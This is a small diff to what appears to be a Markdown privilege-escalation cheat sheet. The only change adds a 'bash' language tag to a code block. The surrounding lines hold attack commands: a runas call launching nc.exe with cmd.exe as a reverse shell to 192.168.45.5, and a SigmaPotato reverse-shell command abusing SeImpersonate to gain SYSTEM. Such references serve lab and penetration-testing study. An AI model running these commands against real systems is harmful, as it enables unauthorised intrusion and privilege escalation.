@@ -833,7 +833,7 @@ runas /env /profile /user:Administrator "c:\temp\nc.exe -e cmd.exe 192.168.45.5 
 
 <summary>SigmaPotato (Windows 2012 - Windows 2022)<br>Abuse seImpersonate privileges to obtain NT AUTHORITY\SYSTEM </summary>
 
-```
+```bash
 .\sigmapotato.exe --revshell 192.168.45.218 4444
 ```
 
